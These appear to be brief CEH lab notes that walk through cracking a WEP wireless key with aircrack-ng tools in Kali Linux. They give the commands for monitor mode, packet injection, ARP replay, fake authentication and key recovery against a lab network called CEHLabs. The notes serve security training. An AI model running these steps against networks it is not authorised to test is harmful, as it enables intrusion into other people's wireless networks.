1- Cracking a WEP Network with Aircrack-ng 
WEP uses a 24-bit initialization vector (IV) to form a stream cipher RC4 for confidentiality, and CRC-32 checksum for integirty of wireless transmission. 
in Kali Linux: 
type: airmon-ng

airmon-ng start wlan0
airodump-ng wlan0mon

aireplay-ng -9 -e CEHLabs -a 20:E5:2a wlan0mon 
a is for injection Test

-e CEHLabs is Wireless Netowrk Name
-a 20:E5 is the MAC address of the Access Point
wlan0mon is the wirelss interface name

And now in a new terminal type

airodump-ng --bssid (mac address of the access point) -c 7 -w WEPcrack wlan0mon0

Next, we need to generate traffic between the AP and the station. In a new termianl type: 

aireplay-ng -3 -b (mac address) -h (mac address of the station) wlan0mon

aireplay-ng -1 0 -e CEHLabs -a (mac addr) -h (mac add) wlan0mon

Note: Capture about 15,000 - 20,000 packets then press CTRL+C. 

Launch aircrack-ng WEPcrack-01.cap. And this will find us the key.
